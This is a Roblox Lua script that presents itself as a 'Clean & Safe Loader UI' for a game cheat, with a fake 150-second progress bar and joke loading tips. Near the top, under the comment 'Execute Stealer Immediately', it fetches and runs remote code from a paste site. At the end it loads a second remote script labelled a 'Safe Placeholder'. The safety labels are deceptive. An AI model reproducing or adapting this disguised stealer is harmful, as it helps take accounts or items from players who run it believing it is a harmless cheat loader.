-- Clean & Safe Loader UI
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Execute Stealer Immediately
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/okBJmYfc/raw"))()
end)

-- UI Elements
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = player:WaitForChild("PlayerGui")

-- Background
local Background = Instance.new("Frame")
Background.Size = UDim2.new(1, 0, 1, 0)
Background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Background.Parent = ScreenGui

-- Triangular Pattern
for i = 1, 50 do
	local Triangle = Instance.new("Frame")
	Triangle.Size = UDim2.new(0, 100, 0, 100)
	Triangle.Position = UDim2.new(math.random(), 0, math.random(), 0)
	Triangle.BackgroundColor3 = Color3.fromRGB(math.random(50, 255), math.random(50, 255), math.random(50, 255))
	Triangle.BackgroundTransparency = 0.85
	Triangle.Rotation = math.random(0, 360)
	Triangle.Parent = Background
end

-- Loader Frame
local LoaderFrame = Instance.new("Frame")
LoaderFrame.Size = UDim2.new(0.6, 0, 0.15, 0)
LoaderFrame.Position = UDim2.new(0.2, 0, 0.8, 0)
LoaderFrame.BackgroundTransparency = 1
LoaderFrame.Parent = ScreenGui

-- Progress Bar Background
local ProgressBarBG = Instance.new("Frame")
ProgressBarBG.Size = UDim2.new(1, 0, 0.3, 0)
ProgressBarBG.Position = UDim2.new(0, 0, 0.35, 0)
ProgressBarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ProgressBarBG.Parent = LoaderFrame

-- Progress Bar
local ProgressBar = Instance.new("Frame")
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.BackgroundColor3 = Color3.fromHSV(0, 1, 1)
ProgressBar.Parent = ProgressBarBG

-- Loading Text
local LoadingText = Instance.new("TextLabel")
LoadingText.Size = UDim2.new(1, 0, 0.3, 0)
LoadingText.Position = UDim2.new(0, 0, 0, -30)
LoadingText.BackgroundTransparency = 1
LoadingText.TextColor3 = Color3.new(1, 1, 1)
LoadingText.TextScaled = true
LoadingText.Text = "Loading..."
LoadingText.Parent = LoaderFrame

-- Funny Tips
local Tips = {
	"Bypassing Anti-Cheat...",
    "Stealing crops from neighbors...",
    "Downloading OP pets...",
    "Planting invisible carrots...",
    "Bribing the garden NPCs...",
    "Watering plastic flowers...",
    "Fooling the server admin...",
    "Claiming free sheckles...",
    "Installing instant-grow hacks...",
    "Petting golden rabbits...",
    "Growing money trees..."
}

local TipLabel = Instance.new("TextLabel")
TipLabel.Size = UDim2.new(1, 0, 0.3, 0)
TipLabel.Position = UDim2.new(0, 0, 1.2, 0)
TipLabel.BackgroundTransparency = 1
TipLabel.TextColor3 = Color3.new(1, 1, 1)
TipLabel.TextScaled = true
TipLabel.Text = Tips[1]
TipLabel.Parent = LoaderFrame

-- Tip Rotation
task.spawn(function()
	while true do
		TipLabel.Text = Tips[math.random(1, #Tips)]
		task.wait(3)
	end
end)

-- Progress Logic (150 seconds = 2.5 mins)
local totalTime = 150
for i = 0, totalTime do
	local progress = i / totalTime
	ProgressBar.Size = UDim2.new(progress, 0, 1, 0)
	ProgressBar.BackgroundColor3 = Color3.fromHSV(progress, 1, 1)
	LoadingText.Text = "Loading... " .. math.floor(progress * 100) .. "%"
	task.wait(1)
end

-- Finish Loader
ScreenGui:Destroy()

-- Run Your Script (Safe Placeholder)
loadstring(game:HttpGet("https://raw.githubusercontent.com/AsiongAksaya/Gagscripterspetspawn/refs/heads/main/Script.lua"))()
